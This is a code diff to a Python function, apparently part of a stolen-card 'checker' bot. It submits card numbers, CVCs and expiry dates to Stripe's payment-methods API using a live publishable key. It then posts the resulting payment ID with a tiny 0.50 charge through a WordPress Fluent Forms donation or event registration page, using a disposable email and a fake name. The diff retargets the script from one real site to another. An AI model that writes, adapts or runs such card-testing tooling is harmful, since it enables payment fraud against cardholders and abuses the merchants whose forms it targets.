@@ -9,7 +9,7 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
-	
+
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
@@ -26,25 +26,25 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fbeauedupwaterfowl.com&time_on_page=36213&key=pk_live_51MUGqiDUa2TR3tnUB2e0XCbtkucgg0iSEJeGtxXcPL0i7JSdVvqSndWQzFTdeWeQXsWDWly6JiZxLpgW63Ucv89z00sdkHHDqi'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Ff998a153d0%3B+stripe-js-v3%2Ff998a153d0%3B+card-element&referrer=https%3A%2F%2Fpentecost.familyfed.eu&time_on_page=122581&key=pk_live_51MlYdjAD3HwNSgHziNbNLIi8Mq04rWRxSiCaOasxEyCaPJdicTar62m3VUK3kYpeB8yhf30V9FVQ14gk8KgGd5UW00vhKk5s5g'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': 'b7231f02-fc2b-4fb3-b1c0-37cfdfb59d5a59193a',
-	    '__stripe_sid': '8b820c6b-2c73-407f-ad7f-0f3c069e0ecae142cf',
+	    '__stripe_mid': 'f05f8048-98bf-4242-a9c8-a9b565834f85db563b',
+	    '__stripe_sid': '989f1c73-b821-4339-a3da-ecc6ffd799b53971e4',
 	}
 	
 	headers = {
-	    'authority': 'beauedupwaterfowl.com',
+	    'authority': 'pentecost.familyfed.eu',
 	    'accept': '*/*',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=b7231f02-fc2b-4fb3-b1c0-37cfdfb59d5a59193a; __stripe_sid=8b820c6b-2c73-407f-ad7f-0f3c069e0ecae142cf',
-	    'origin': 'https://beauedupwaterfowl.com',
-	    'referer': 'https://beauedupwaterfowl.com/',
+	    # 'cookie': '__stripe_mid=f05f8048-98bf-4242-a9c8-a9b565834f85db563b; __stripe_sid=989f1c73-b821-4339-a3da-ecc6ffd799b53971e4',
+	    'origin': 'https://pentecost.familyfed.eu',
+	    'referer': 'https://pentecost.familyfed.eu/register-for-the-event/',
 	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -56,17 +56,13 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1736118867537',
+	    't': '1736327346771',
 	}
 	
-	data = {
-	    'data': '__fluent_form_embded_post_id=4&_fluentform_5_fluentformnonce=9c35f762e9&_wp_http_referer=%2F&names_1%5Bfirst_name%5D=Rodam&names_1%5Blast_name%5D=User&email=lajaro6411%40matmayer.com&phone=2085812225&dropdown=Turkey%20Hunting&cpt_selection=675&input_radio=Online&numeric-field_11=1&numeric-field_12=200&custom-payment-amount_2=0.50&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
-	    'action': 'fluentform_submit',
-	    'form_id': '5',
-	}
+	data = 'data=__fluent_form_embded_post_id%3D474%26_fluentform_3_fluentformnonce%3D62150a160b%26_wp_http_referer%3D%252Fregister-for-the-event%252F%26names%255Bfirst_name%255D%3DRodam%26names%255Bmiddle_name%255D%3D%26names%255Blast_name%255D%3DUser%26email%3Dlajaro6411%2540matmayer.com%26phone%3D2085812225%26country-list%3DUS%26payment_input_7%3DI%2520am%2520coming%2520with%2520my%2520sibling%252Ffriend%2520(Select%2520below)%26payment_input_4%3D20%26item-quantity%3D%26description%3D%26payment_input%3DOther%2520amount%26custom-payment-amount%3D0.50%26gdpr-agreement%3Don%26terms-n-condition%3Don%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=3'
 	
 	r2 = requests.post(
-	    'https://beauedupwaterfowl.com/wp-admin/admin-ajax.php',
+	    'https://pentecost.familyfed.eu/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
